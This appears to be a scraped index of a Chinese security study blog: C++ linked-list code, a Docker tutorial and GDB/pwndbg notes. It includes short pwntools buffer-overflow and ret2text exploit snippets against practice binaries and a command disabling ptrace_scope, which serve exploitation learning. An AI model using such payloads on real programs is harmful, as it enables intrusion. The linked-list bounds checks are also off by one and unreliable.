LinkedList\u0026lt;T_ELE\u0026gt;::LinkedList()\r:m_head(NULL), m_dwLength(0)\r{\r}\r//析构函数 清空元素\ttemplate\u0026lt;class T_ELE\u0026gt; LinkedList\u0026lt;T_ELE\u0026gt;::~LinkedList()\r{\rClear();\r}\r//判断链表是否为空\ttemplate\u0026lt;class T_ELE\u0026gt; BOOL LinkedList\u0026lt;T_ELE\u0026gt;::IsEmpty()\r{\rif (m_head == NULL || m_dwLength == 0)\r{\rreturn TRUE;\r}\relse\r{\rreturn FALSE;\r}\r}\r//清空链表\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::Clear()\r{\r// 1. 判断链表是否为空\tif (m_head == NULL || m_dwLength == 0)\r{\rreturn BUFFER_IS_EMPTY;\r}\r// 2. 循环删除链表中的节点\tNODE\u0026lt;T_ELE\u0026gt;* pTempNode = m_head;\rfor (DWORD i = 0; i \u0026lt; m_dwLength; i++)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pIterator = pTempNode;\rpTempNode = pTempNode-\u0026gt;pNext;\rdelete pIterator;\r}\r// 3. 删除最后一个节点并将链表长度置为0\tm_head = NULL;\rm_dwLength = 0;\rreturn SUCCESS;\r}\r//根据索引获取元素\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::GetElement(IN DWORD dwIndex, OUT T_ELE\u0026amp; Element)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pTempNode = NULL;\r// 1. 判断索引是否有效\tif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwLength)\r{\rreturn INDEX_IS_ERROR;\r}\r// 2. 取得索引指向的节点\tpTempNode = m_head;\rfor (DWORD i = 0; i \u0026lt; dwIndex; i++)\r{\rpTempNode = pTempNode-\u0026gt;pNext;\r}\r// 3. 将索引指向节点的值复制到OUT参数\tmemcpy(\u0026amp;Element, \u0026amp;pTempNode-\u0026gt;Data, sizeof(T_ELE));\rreturn SUCCESS;\r}\r//根据元素内容获取索引\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::GetElementIndex(IN T_ELE\u0026amp; Element)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pTempNode = NULL;\r// 1. 判断链表是否为空\tif (m_head == NULL || m_dwLength == 0)\r{\rreturn INDEX_IS_ERROR;\r}\r// 2. 循环遍历链表，找到与Element相同的元素\tpTempNode = m_head;\rfor (DWORD i = 0; i \u0026lt; m_dwLength; i++)\r{\rif (!memcmp(\u0026amp;Element, \u0026amp;pTempNode-\u0026gt;Data, sizeof(T_ELE)))\r{\rreturn i;\r}\rpTempNode = pTempNode-\u0026gt;pNext;\r}\rreturn ERROR;\r}\r//在链表尾部新增节点\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::Insert(IN T_ELE Element)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pNewNode = new NODE\u0026lt;T_ELE\u0026gt;;\rmemset(pNewNode, 0, sizeof(NODE\u0026lt;T_ELE\u0026gt;));\rmemcpy(\u0026amp;pNewNode-\u0026gt;Data, \u0026amp;Element, sizeof(T_ELE));\r// 1. 判断链表是否为空\tif (m_head == NULL || m_dwLength == 0)\r{\rm_head = pNewNode;\rm_dwLength++;\rreturn SUCCESS;\r}\r// 2. 如果链表中已经有元素\tNODE\u0026lt;T_ELE\u0026gt;* pTempNode = m_head;\rfor (DWORD i = 0; i \u0026lt; m_dwLength - 1; i++)\r{\rpTempNode = pTempNode-\u0026gt;pNext;\r}\rpTempNode-\u0026gt;pNext = pNewNode;\rm_dwLength++;\rreturn SUCCESS;\r}\r//将节点新增到指定索引的位置\t0 1 2 3 4\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::Insert(IN DWORD dwIndex, IN T_ELE Element)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pPreviousNode = NULL;\rNODE\u0026lt;T_ELE\u0026gt;* pCurrentNode = NULL;\rNODE\u0026lt;T_ELE\u0026gt;* pNextNode = NULL;\rNODE\u0026lt;T_ELE\u0026gt;* pNewNode = new NODE\u0026lt;T_ELE\u0026gt;;\rmemset(pNewNode, 0, sizeof(NODE\u0026lt;T_ELE\u0026gt;));\rmemcpy(\u0026amp;pNewNode-\u0026gt;Data, \u0026amp;Element, sizeof(T_ELE));\r// 1. 判断链表是否为空\tif (m_head == NULL || m_dwLength == 0)\r{\rif (dwIndex == 0)\r{\rm_head = pNewNode;\rm_dwLength++;\rreturn SUCCESS;\r}\rreturn BUFFER_IS_EMPTY;\r}\r// 2. 判断索引值是否有效\tif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwLength)\r{\rreturn INDEX_IS_ERROR;\r}\r// 3. 如果索引为0\tif (dwIndex == 0)\r{\rpNewNode-\u0026gt;pNext = m_head;\rm_head = pNewNode;\rm_dwLength++;\rreturn SUCCESS;\r}\r// 4. 如果索引为链表尾\tif (dwIndex == m_dwLength)\r{\rpCurrentNode = m_head;\rfor (DWORD i = 0; i \u0026lt; dwIndex - 1; i++)\r{\rpCurrentNode = pCurrentNode-\u0026gt;pNext;\r}\rpCurrentNode-\u0026gt;pNext = pNewNode;\rm_dwLength++;\rreturn SUCCESS;\r}\r// 5. 如果索引为链表中\tpCurrentNode = m_head;\rfor (DWORD i = 0; i \u0026lt; dwIndex - 1; i++)\r{\rpCurrentNode = pCurrentNode-\u0026gt;pNext;\r}\rpNextNode = pCurrentNode-\u0026gt;pNext;\rpCurrentNode-\u0026gt;pNext = pNewNode;\rpNewNode-\u0026gt;pNext = pNextNode;\rm_dwLength++;\rreturn SUCCESS;\r}\r//根据索引删除节点\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::Delete(IN DWORD dwIndex)\r{\rNODE\u0026lt;T_ELE\u0026gt;* pPreviousNode = NULL;\rNODE\u0026lt;T_ELE\u0026gt;* pCurrentNode = NULL;\rNODE\u0026lt;T_ELE\u0026gt;* pNextNode = NULL;\r// 1. 判断链表是否为空\tif (m_head == NULL || m_dwLength == 0)\r{\rreturn BUFFER_IS_EMPTY;\r}\r// 2. 判断索引值是否有效\tif (dwIndex\u0026lt;0 || dwIndex\u0026gt;m_dwLength)\r{\rreturn INDEX_IS_ERROR;\r}\r// 3. 如果链表中只有头节点，且要删除头节点\tif (m_dwLength == 1 \u0026amp;\u0026amp; dwIndex == 0)\r{\rdelete m_head;\rm_head = NULL;\rm_dwLength--;\rreturn SUCCESS;\r}\r// 4. 如果要删除头节点\tif (dwIndex == 0)\r{\rpNextNode = m_head-\u0026gt;pNext;\rdelete m_head;\rm_head = pNextNode;\rm_dwLength--;\rreturn SUCCESS;\r}\r// 5. 如果是其他情况\tpPreviousNode = m_head;\rfor (DWORD i = 0; i \u0026lt; dwIndex - 1; i++)\r{\rpPreviousNode = pPreviousNode-\u0026gt;pNext;\r}\rpCurrentNode = pPreviousNode-\u0026gt;pNext;\rpNextNode = pCurrentNode-\u0026gt;pNext;\rpPreviousNode-\u0026gt;pNext = pNextNode;\rdelete pCurrentNode;\rm_dwLength--;\rreturn SUCCESS;\r}\r//获取链表中节点的数量\ttemplate\u0026lt;class T_ELE\u0026gt; DWORD LinkedList\u0026lt;T_ELE\u0026gt;::GetSize()\r{\rif (m_head == NULL || m_dwLength == 0)\r{\rreturn BUFFER_IS_EMPTY;\r}\relse\r{\rreturn m_dwLength;\r}\r}\rtemplate\u0026lt;class T_ELE\u0026gt; VOID LinkedList\u0026lt;T_ELE\u0026gt;::Show()\r{\rif (m_head == NULL || m_dwLength == 0)\r{\rprintf(\u0026quot;Linklist is empty.\\n\u0026quot;);\rreturn;\r}\rNODE\u0026lt;T_ELE\u0026gt;* pTempNode = m_head;\rfor (DWORD i = 0; i \u0026lt; m_dwLength; i++)\r{\rprintf(\u0026quot;pNode-\u0026gt;data: %d\\n\u0026quot;, pTempNode-\u0026gt;Data);\rpTempNode = pTempNode-\u0026gt;pNext;\r}\r}\rVOID TestLink()\r{\rLinkedList\u0026lt;int\u0026gt; Link;\rint index = 4;\rint value = 0;\rint element = 10;\rLink.Insert(0, 9);\rLink.Insert(1);\rprintf(\u0026quot;Link.GetElementIndex(%d): %d\\n\u0026quot;, element, Link.GetElementIndex(element));\rLink.Insert(1, 8);\rLink.Insert(2);\rprintf(\u0026quot;Link.GetSize(): %d\\n\u0026quot;, Link.GetSize());\rLink.Insert(3);\rLink.GetElement(index, value);\rprintf(\u0026quot;Link.GetElement(%d, %d)\\n\u0026quot;, index, value);\rLink.Delete(1);\rLink.Delete(0);\rLink.Delete(2);\rprintf(\u0026quot;Link.GetSize(): %d\\n\u0026quot;, Link.GetSize());\rLink.Insert(1);\rLink.Show();\rLink.Clear();\rLink.Show();\r}\rint main()\r{\rTestLink();\rreturn 0;\r}\r","permalink":"https://inten.kro1lsec.com/post/%E5%9F%BA%E7%A1%80c/","summary":"裸函数 void __declspec(naked) Function() //编译器不执行格外操作\r{\r__asm //在c中调用汇编格式__asm{}\r{\rret } //需要手动写ret才能正常运行\r}\r常见的几种调用约定：\n__cdecl:默认调用约定。外平栈。\n__stdcall:内平栈。\n__fastcall:2个参数以内时，直接用寄存器存取数据，提高执行速度。内平栈。\n浮点数的存储 以12.5为例\n符号部分：正数为0，负数为1\n12=\u0026raquo; c =\u0026raquo; 1100\n0.5 乘二取整 1.0 =\u0026raquo;1\n12.5 =\u0026raquo; 1100.1 =\u0026raquo; 1.1001 * 10^3\n尾数部分： 1001 0000000000000000000\n指数部分：127 + 3 = 130 =\u0026raquo; 1000 0010 //127 + 指数计算即可\n0 1000 0010 1001 0000000000000000000\n内存图 全局变量\u0026amp;局部变量 mov [ arr (00427326)] ，eax //全局变量\rmov dword ptr [ebp-4] , 6Ah //局部变量\rmov dword ptr [ebp-8], 14h\r全局变量","title":"[基础]C/C++"},{"content":"Docker\n基本概念 Docker 包括三个基本概念\n 镜像（Image） 容器（Container） 仓库（Repository）  简单理解：\n镜像（Image）和容器（Container）== 面向对象中的 类 和 实例 。\n镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。\n镜像 导入镜像 先变成管理员再导入\n$sudo su $cat ubuntu17.04x86.tar | docker import - ubuntu17.04x86 获取镜像 docker pull。其命令格式为：\n$ docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签] 比如：省略了仓库地址，默认从官网获取\n$ docker pull ubuntu:18.04 列出镜像 docker image ls\n$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE redis latest 5f515359c7f8 5 days ago 183 MB nginx latest 05a60462f8ba 5 days ago 181 MB mongo 3.2 fe9198c04d62 5 days ago 342 MB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 00285df0df87 5 days ago 342 MB ubuntu 18.04 f753707788c5 4 weeks ago 127 MB ubuntu latest f753707788c5 4 weeks ago 127 MB 列表包含了 仓库名、标签、镜像 ID、创建时间 以及 所占用的空间。\n其中仓库名、标签在之前的基础概念章节已经介绍过了。镜像 ID 则是镜像的唯一标识，一个镜像可以对应多个 标签。因此，在上面的例子中，我们可以看到 ubuntu:18.04 和 ubuntu:latest 拥有相同的 ID，因为它们对应的是同一个镜像。\n虚悬镜像 上面的镜像列表中，还可以看到一个特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 。\n\u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 00285df0df87 5 days ago 342 MB 一般来说， 可以随意删除的\n$ docker image prune 删除本地镜像 如果要删除本地的镜像，可以使用 docker image rm 命令，其格式为：\n$ docker image rm [选项] \u0026lt;镜像1\u0026gt; [\u0026lt;镜像2\u0026gt; ...] 其中，\u0026lt;镜像\u0026gt; 可以是 镜像短 ID、镜像长 ID、镜像名 或者 镜像摘要。\n比如我们有这么一些镜像：\n$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE centos latest 0584b3d2cf6d 3 weeks ago 196.5 MB redis alpine 501ad78535f0 3 weeks ago 21.03 MB docker latest cf693ec9b5c7 3 weeks ago 105.1 MB nginx latest e43d811ce2f4 5 weeks ago 181.5 MB 我们可以用镜像的完整 ID，也称为 长 ID，来删除镜像。使用脚本的时候可能会用长 ID，但是人工输入就太累了，所以更多的时候是用 短 ID 来删除镜像。docker image ls 默认列出的就已经是短 ID 了，一般取前3个字符以上，只要足够区分于别的镜像就可以了。\n比如这里，如果我们要删除 redis:alpine 镜像，可以执行：\n$ docker image rm 501 Untagged: redis:alpine Untagged: redis@sha256:f1ed3708f538b537eb9c2a7dd50dc90a706f7debd7e1196c9264edeea521a86d Deleted: sha256:501ad78535f015d88872e13fa87a828425117e3d28075d0c117932b05bf189b7 Deleted: sha256:96167737e29ca8e9d74982ef2a0dda76ed7b430da55e321c071f0dbff8c2899b Deleted: sha256:32770d1dcf835f192cafd6b9263b7b597a1778a403a109e2cc2ee866f74adf23 Deleted: sha256:127227698ad74a5846ff5153475e03439d96d4b1c7f2a449c7a826ef74a2d2fa Deleted: sha256:1333ecc582459bac54e1437335c0816bc17634e131ea0cc48daa27d32c75eab3 Deleted: sha256:4fc455b921edf9c4aea207c51ab39b10b06540c8b4825ba57b3feed1668fa7c7 我们也可以用镜像名，也就是 \u0026lt;仓库名\u0026gt;:\u0026lt;标签\u0026gt;，来删除镜像。\n$ docker image rm centos Untagged: centos:latest Untagged: centos@sha256:b2f9d1c0ff5f87a4743104d099a3d561002ac500db1b9bfa02a783a46e0d366c Deleted: sha256:0584b3d2cf6d235ee310cf14b54667d889887b838d3f3d3033acd70fc3c48b8a Deleted: sha256:97ca462ad9eeae25941546209454496e1d66749d53dfa2ee32bf1faabd239d38 容器 启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。\n因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新创建容器。\n运行容器 有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。以上面的 ubuntu:18.04 为例，如果我们打算启动里面的 bash 并且进行交互式操作的话，可以执行下面的命令。\n$ docker run -it --rm ubuntu/17.04.amd64 bash docker run 就是运行容器的命令，具体格式我们会在 容器 一节进行详细讲解，我们这里简要的说明一下上面用到的参数。\n -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 --rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 --rm 可以避免浪费空间。 ubuntu:18.04：这是指用 ubuntu:18.04 镜像为基础来启动容器。 bash：放在镜像名后的是 命令，这里我们希望有个交互式 Shell，因此用的是 bash。  进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 cat /etc/os-release，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 Ubuntu 18.04.1 LTS 系统。\n最后我们通过 exit 退出了这个容器。\n新建并启动\n所需要的命令主要为 docker run。\n例如，下面的命令输出一个 “Hello World”，之后终止容器。\n$ docker run ubuntu:18.04 /bin/echo \u0026#39;Hello world\u0026#39; Hello world 这跟在本地直接执行 /bin/echo 'hello world' 几乎感觉不出任何区别。\n下面的命令则启动一个 bash 终端，允许用户进行交互。\n$ docker run -t -i ubuntu:18.04 /bin/bash root@af8bae53bdd3:/# 其中，-t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， -i 则让容器的标准输入保持打开。\n在交互模式下，用户可以通过所创建的终端来输入命令，例如\nroot@af8bae53bdd3:/# pwd / root@af8bae53bdd3:/# ls bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 当利用 docker run 来创建容器时，Docker 在后台运行的标准操作包括：\n 检查本地是否存在指定的镜像，不存在就从公有仓库下载 利用镜像创建并启动一个容器 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层 从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去 从地址池配置一个 ip 地址给容器 执行用户指定的应用程序 执行完毕后容器被终止  终止容器 可以使用 docker container stop 来终止一个运行中的容器。\n此外，当 Docker 容器中指定的应用终结时，容器也自动终止。\n例如对于上一章节中只启动了一个终端的容器，用户通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。\n终止状态的容器可以用 docker container ls -a 命令看到。例如\ndocker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ba267838cc1b ubuntu:18.04 \u0026#34;/bin/bash\u0026#34; 30 minutes ago Exited (0) About a minute ago trusting_newton 处于终止状态的容器，可以通过 docker container start 命令来重新启动。\n此外，docker container restart 命令会将一个运行态的容器终止，然后再重新启动它。\n启动已终止容器 可以利用 docker container start 命令，直接将一个已经终止的容器启动运行。\ndocker container rename ubuntu/17.04.amd64 pwntest\n删除容器 可以使用 docker container rm 来删除一个处于终止状态的容器。例如\n$ docker container rm trusting_newton //清理所有处于终止状态的容器。 $ docker container prune 拷贝文件到容器 查看已经启动的容器\nroot@ubuntu:/home/puret/Desktop/pwnti/01 # docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES d3d424e134a9 ubuntu/17.04.amd64 \u0026#34;bash\u0026#34; 53 seconds ago Up 50 seconds pedantic_euclid 复制文件\ndocker cp 文件 容器id:新文件\nroot@ubuntu:/home/puret/Desktop/pwnti/01 # docker cp hello d3d424e134a9:/hello socat tcp-listen:10001,reuseaddr,fork EXEC:./pwn,pty,raw\nfrom pwn import * io = remote(\u0026#39;172.17.0.2\u0026#39;,10001) payload = \u0026#39;A\u0026#39;*22 + p32(0x0804846B) io.send(payload) io.interactive() apt-get install -f\rdpkg --configure -a\rapt-get clean\rapt-get update\rapt-get upgrade\r","permalink":"https://inten.kro1lsec.com/post/%E5%B7%A5%E5%85%B7docker/","summary":"Docker\n基本概念 Docker 包括三个基本概念\n 镜像（Image） 容器（Container） 仓库（Repository）  简单理解：\n镜像（Image）和容器（Container）== 面向对象中的 类 和 实例 。\n镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。\n镜像 导入镜像 先变成管理员再导入\n$sudo su $cat ubuntu17.04x86.tar | docker import - ubuntu17.04x86 获取镜像 docker pull。其命令格式为：\n$ docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签] 比如：省略了仓库地址，默认从官网获取\n$ docker pull ubuntu:18.04 列出镜像 docker image ls\n$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE redis latest 5f515359c7f8 5 days ago 183 MB nginx latest 05a60462f8ba 5 days ago 181 MB mongo 3.","title":"[工具]Docker"},{"content":"小记 GDB\u0026amp;Pwndbg run：r 开始执行 continue：c 继续执行，到下一个断点 stack 24 查看栈中24个单位的数据 vmmap 虚拟内存的空间分布 gdb link plt 查看plt表 got 查看got表 x/20 gxb info b 查看断点 start 停留在main函数的第一行，如果没有，则停留在入口 backtrace 显示函数调用栈 return 跳出当前函数 gdb 里面 单步调试分两种一种是C语言级别的单步n一种是汇编指令级别的单步nini按一次 之后直接回车就好了gdb自动重复指令的 next：n 单步步过 ni： 汇编指令级别的单步步过\nstep：s 单步步入\nsi：汇编指令级别的 单步步入\ndissa addr： 对函数或地址处的指令进行反汇编\nb *addr：下断点\nx addr：查看地址addr处存储的数据值\ninfo function/ b：查看函数/ 断点\nx/ nfu \u0026lt;addr\u0026gt;查看内存： n：要显示内存单元的个数 f：显示方式 u：一个地址单元的长度 gdb.attach() 连到第一次输入之后 断点下到 gets 之后那一句\npwndbg\u0026gt; vmmap\n查看地址是否可读可写\n使用方法:x先 r ,然后Ctrl C暂停,缓存不会清空.再vmmap\n简单的偏移计算示例 推断为esp寻址\nfrom pwn import * p = process(\u0026quot;./ret2.text\u0026quot;) #esp寻址，编译器会优化。需要+8个字节 esp_padding = \u0026quot;junkjunk\u0026quot; #32位为+4，64位+8 ebp_fake = \u0026quot;junk\u0026quot; #定义char s 分配了64的空间 padding = \u0026quot;a\u0026quot;*0x64 #call system 函数 上一行 mov... 传入参数的地址 ret_addr = 0x0804863A payload = padding + ebp_fake + esp_padding + p32(ret_addr) p.sendlineafter(\u0026quot;There is something amazing here,do you know any thing?\\n\u0026quot;，payload) p.interactive() 组成架构 基本工作原理 gdb 通过系统调用 ptrace 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。ptrace 系统调用的原型如下：\n#include \u0026lt;sys/ptrace.h\u0026gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);  pid_t pid：指示 ptrace 要跟踪的进程。 void *addr：指示要监控的内存地址。 void *data：存放读取出的或者要写入的数据。 enum __ptrace_request request：决定了系统调用的功能，几个主要的选项：  PTRACE_TRACEME：表示此进程将被父进程跟踪，任何信号（除了 SIGKILL）都会暂停子进程，接着阻塞于 wait() 等待的父进程被唤醒。子进程内部对 exec() 的调用将发出 SIGTRAP 信号，这可以让父进程在子进程新程序开始运行之前就完全控制它。 PTRACE_ATTACH：attach 到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次 PTRACE_TRACEME 操作。但需要注意的是，虽然当前进程成为被跟踪进程的父进程，但是子进程使用 getppid() 的到的仍将是其原始父进程的 pid。 PTRACE_CONT：继续运行之前停止的子进程。可同时向子进程交付指定的信号。    三种调试方式  运行并调试一个新进程  运行 gdb，通过命令行或 file 命令指定目标程序。 输入 run 命令， gdb 执行下面的操作：  通过 fork() 系统调用创建一个新进程 在新创建的子进程中执行操作：ptrace(PTRACE_TRACEME, 0, 0, 0) 在子进程中通过 execv() 系统调用加载用户指定的可执行文件     attach 并调试一个已经运行的进程  用户确定需要进行调试的进程 PID 运行 gdb，输入 attach \u0026lt;pid\u0026gt;，gdb 将对指定进程执行操作：ptrace(PTRACE_ATTACH, pid, 0, 0)   远程调试目标机上新创建的进程  gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）定义 RSP 协议数据的基本格式为： $..........#xx gdbserver 的启动方式相当于运行并调试一个新创建的进程    注意，在你将 gdb attach 到一个进程时，可能会出现这样的问题：\ngdb-peda$ attach 9091 Attaching to process 9091 ptrace: Operation not permitted. 这是因为开启了内核参数 ptrace_scope：\n$ cat /proc/sys/kernel/yama/ptrace_scope 1 1 表示 True，此时普通用户进程是不能对其他进程进行 attach 操作的，当然你可以用 root 权限启动 gdb，但最好的办法还是关掉它：\n# echo 0 \u0026gt; /proc/sys/kernel/yama/ptrace_scope 断点的实现 断点的功能是通过内核信号实现的，在 x86 架构上，内核向某个地址打入断点，实际上就是往该地址写入断点指令 INT 3，即 0xCC。目标程序运行到这条指令之后会触发 SIGTRAP 信号，gdb 捕获这个信号，并根据目标程序当前停止的位置查询 gdb 维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。\ngdb 基本操作 使用 -tui 选项可以将代码显示在一个漂亮的交互式窗口中。\nbreak \u0026ndash; b  break 当不带参数时，在所选栈帧中执行的下一条指令处设置断点。 break \u0026lt;function\u0026gt; 在函数体入口处打断点。 break \u0026lt;line\u0026gt; 在当前源码文件指定行的开始处打断点。 break -N break +N 在当前源码行前面或后面的 N 行开始处打断点，N 为正整数。 break \u0026lt;filename:line\u0026gt; 在源码文件 filename 的 line 行处打断点。 break \u0026lt;filename:function\u0026gt; 在源码文件 filename 的 function 函数入口处打断点。 break \u0026lt;address\u0026gt; 在程序指令的地址处打断点。 break ... if \u0026lt;cond\u0026gt; 设置条件断点，... 代表上述参数之一（或无参数），cond 为条件表达式，仅在 cond 值非零时停住程序。  info  info breakpoints -- i b 查看断点，观察点和捕获点的列表。  info breakpoints [list…] info break [list…] list… 用来指定若干个断点的编号（可省略），可以是 2， 1-3， 2 5 等。   info display 打印自动显示的表达式列表，每个表达式都带有项目编号，但不显示其值。 info reg 显示当前寄存器信息。 info threads 打印出所有线程的信息，包含 Thread ID、Target ID 和 Frame。 info frame 打印出指定栈帧的详细信息。 info proc 查看 proc 里的进程信息。  disable \u0026ndash; dis 禁用断点，参数使用空格分隔。不带参数时禁用所有断点。\n disable [breakpoints] [list…] breakpoints 是 disable 的子命令（可省略），list… 同 info breakpoints 中的描述。  enable 启用断点，参数使用空格分隔。不带参数时启用所有断点。\n enable [breakpoints] [list…] 启用指定的断点（或所有定义的断点）。 enable [breakpoints] once list… 临时启用指定的断点。GDB 在停止您的程序后立即禁用这些断点。 enable [breakpoints] delete list… 使指定的断点启用一次，然后删除。一旦您的程序停止，GDB 就会删除这些断点。等效于用 tbreak 设置的断点。  breakpoints 同 disable 中的描述。\nclear 在指定行或函数处清除断点。参数可以是行号，函数名称或 * 跟一个地址。\n clear 当不带参数时，清除所选栈帧在执行的源码行中的所有断点。 clear \u0026lt;function\u0026gt;, clear \u0026lt;filename:function\u0026gt; 删除在命名函数的入口处设置的任何断点。 clear \u0026lt;line\u0026gt;, clear \u0026lt;filename:line\u0026gt; 删除在指定的文件指定的行号的代码中设置的任何断点。 clear \u0026lt;address\u0026gt; 清除指定程序指令的地址处的断点。  delete \u0026ndash; d 删除断点。参数使用空格分隔。不带参数时删除所有断点。\n delete [breakpoints] [list…]  tbreak 设置临时断点。参数形式同 break 一样。当第一次命中时被删除。\nwatch 为表达式设置观察点。每当一个表达式的值改变时，观察点就会停止执行您的程序。\n watch [-l|-location] \u0026lt;expr\u0026gt; 如果给出了 -l 或者 -location，则它会对 expr 求值并观察它所指向的内存。  另外 rwatch 表示在访问时停止，awatch 表示在访问和改变时都停止。\nstep \u0026ndash; s 单步执行程序，直到到达不同的源码行。\n step [N] 参数 N 表示执行 N 次（或由于另一个原因直到程序停止）。  reverse-step 反向步进程序，直到到达另一个源码行的开头。\n reverse-step [N] 参数 N 表示执行 N 次（或由于另一个原因直到程序停止）。  next \u0026ndash; n 单步执行程序，执行完子程序调用。\n next [N]  与 step 不同，如果当前的源代码行调用子程序，则此命令不会进入子程序，而是继续执行，将其视为单个源代码行。\nreverse-next 反向步进程序，执行完子程序调用。\n reverse-next [N]  如果要执行的源代码行调用子程序，则此命令不会进入子程序，调用被视为一个指令。\nreturn 您可以使用 return 命令取消函数调用的执行。如果你给出一个表达式参数，它的值被用作函数的返回值。\n return \u0026lt;expression\u0026gt; 将 expression 的值作为函数的返回值并使函数直接返回。  finish \u0026ndash; fin 执行直到选定的栈帧返回。\n finish  until \u0026ndash; u 执行程序直到大于当前栈帧或当前栈帧中的指定位置（与 break 命令相同的参数）的源码行。此命令常用于通过一个循环，以避免单步执行。\n until \u0026lt;location\u0026gt; 继续运行程序，直到达到指定的位置，或者当前栈帧返回。  continue \u0026ndash; c 在信号或断点之后，继续运行被调试的程序。\n continue [N]  如果从断点开始，可以使用数字 N 作为参数，这意味着将该断点的忽略计数设置为 N - 1(以便断点在第 N 次到达之前不会中断)。\nprint \u0026ndash; p 求表达式 expr 的值并打印。可访问的变量是所选栈帧的词法环境，以及范围为全局或整个文件的所有变量。\n print [expr] print /f [expr] 通过指定 /f 来选择不同的打印格式，其中 f 是一个指定格式的字母  x 检查内存。\n x/nfu \u0026lt;addr\u0026gt; x \u0026lt;addr\u0026gt;  n, f, 和 u 都是可选参数，用于指定要显示的内存以及如何格式化。 addr 是要开始显示内存的地址的表达式。 n 重复次数（默认值是 1），指定要显示多少个单位（由 u 指定）的内存值。 f 显示格式（初始默认值是 x），显示格式是 print('x'，'d'，'u'，'o'，'t'，'a'，'c'，'f'，'s') 使用的格式之一，再加 i（机器指令）。 u 单位大小，b 表示单字节，h 表示双字节，w 表示四字节，g 表示八字节。    display 每次程序停止时打印表达式 expr 的值。\n display \u0026lt;expr\u0026gt; display/fmt \u0026lt;expr\u0026gt; display/fmt \u0026lt;addr\u0026gt;  fmt 用于指定显示格式。对于格式 i 或 s，或者包括单位大小或单位数量，将表达式 addr 添加为每次程序停止时要检查的内存地址。\ndisassemble \u0026ndash; disas 反汇编命令。\n disas \u0026lt;func\u0026gt; 反汇编指定函数 disas \u0026lt;addr\u0026gt; 反汇编某地址所在函数 disas \u0026lt;begin_addr\u0026gt; \u0026lt;end_addr\u0026gt; 反汇编从开始地址到结束地址的部分  undisplay 取消某些表达式在程序停止时自动显示。参数是表达式的编号（使用 info display 查询编号）。不带参数表示取消所有自动显示表达式。\ndisable display 禁用某些表达式在程序停止时自动显示。禁用的显示项目被再次启用。参数是表达式的编号（使用 info display 查询编号）。不带参数表示禁用所有自动显示表达式。\nenable display 启用某些表达式在程序停止时自动显示。参数是重新显示的表达式的编号（使用 info display 查询编号）。不带参数表示启用所有自动显示表达式。\nhelp \u0026ndash; h 打印命令列表。\n help \u0026lt;class\u0026gt; 您可以获取该类中各个命令的列表。 help \u0026lt;command\u0026gt; 显示如何使用该命令的简述。  attach 挂接到 GDB 之外的进程或文件。将进程 ID 或设备文件作为参数。\n attach \u0026lt;process-id\u0026gt;  run \u0026ndash; r 启动被调试的程序。可以直接指定参数，也可以用 set args 设置（启动所需的）参数。还允许使用 \u0026gt;, \u0026lt;, 或 \u0026gt;\u0026gt; 进行输入和输出重定向。\n甚至可以运行一个脚本，如：\nrun `python2 -c 'print \u0026quot;A\u0026quot;*100'` backtrace \u0026ndash; bt 打印整个栈的回溯。\n bt 打印整个栈的回溯，每个栈帧一行。 bt n 类似于上，但只打印最内层的 n 个栈帧。 bt -n 类似于上，但只打印最外层的 n 个栈帧。 bt full n 类似于 bt n，还打印局部变量的值。   注意：使用 gdb 调试时，会自动关闭 ASLR，所以可能每次看到的栈地址都不变。\n ptype 打印类型 TYPE 